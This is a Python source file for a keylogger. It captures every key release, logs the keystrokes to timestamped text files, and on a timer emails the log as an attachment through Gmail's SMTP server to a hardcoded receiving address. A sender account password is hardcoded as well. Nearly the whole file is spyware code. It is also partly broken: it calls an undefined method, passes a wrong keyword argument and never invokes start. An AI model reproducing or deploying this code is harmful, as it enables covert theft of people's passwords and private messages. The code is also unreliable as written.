#!/usr/bin/env python
#-*- coding: utf-8 -*-

#what i could implement
#strong ephases on classes and hierchy or inheritence/abstract classes
#if the is an if or else statement turn it into a terinary statement
#array list or collectrions
#reading writting to files

#getting keystrokes
import keyboard

#for emailing
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#for measuring dates and timers
from threading import Timer
from datetime import datetime


#static variables 
EMAIL = "keypoggers@gmail.com"
EMAILPASS = "ZDSBNJKHF!62ukzhgkuyfwuS@D%@!3ndhvgwe"
SECINDAY = 86400
EMAILRECIVE = "keypogreciver@gmail.com"

class keyLogger:
    def __init__(self,interval):
        self.interval = interval
       #the string that logs keystrokes
        self.log = ""
        #records date and time of starting and ending
        self.startDate = datetime.now()
        self.endDate = datetime.now()
      
    def keysTracking(self,event):
      #call this with KET_UP event 
        #here is where we detect keys being pressed
      name = event.name
      if len(name) > 1:
            #for special keys

            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #catches anything else as an underscore [IMPROVE LATER]
                name = " "

      self.log += name


    def naming(self):
        startDatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        endDatestr = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = "keylog-"+str(startDatestr)+"-"+str(endDatestr)
        #f strings loooking iffy here idk if its vim but we'll see|3/20/22 used str() to work around

    def fileHandler(self):
        #try and finally block so that the file closes safely
        try:
            f = open(str(self.filename)+".txt", 'w')
            f.write(self.log)
        finally:
            f.close()

    def carrierPidgeon(self, email, password, reciver, logstr, subject):
#subject will act as the subject and file name to keep code more simple
#for attatching files
        #setting up MIMEMultipart (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)
        
        mime = MIMEMultipart()
        mime['From'] = email
        mime['To'] = reciver
        mime['Subject'] = subject
        #body and attatchments
        mime.attach(MIMEText(logstr, 'plain'))        
        attach_file_name = subject 
        attach_file = open(attach_file_name, 'rb')
        
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)#encodes attatchment
        #add header with filename
        payload.add_header('Content-Decomposition', 'attachment', filename= attach_file_name)
        mime.attach(payload)
        
        #connect to mail server
        server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
        server.starttls()
        #logging in
        server.login(email, password)
        text = mime.as_string()
        server.sendmail(email, reciver, text)
        server.quit()

    def report(self):
        if self.log:
            self.endDate = datetime.now()
            self.handler()
            #emailing
            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
            self.log = ""

        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True

        timer.start()
    def start(self):
        self.startDate = datetime.now()

        keyboard.on_release(keysTracking = self.keysTracking)

        self.report()
        keyboard.wait()




if __name__ == "__main__":
    keyLogger(interval=5)
    keyLogger.start
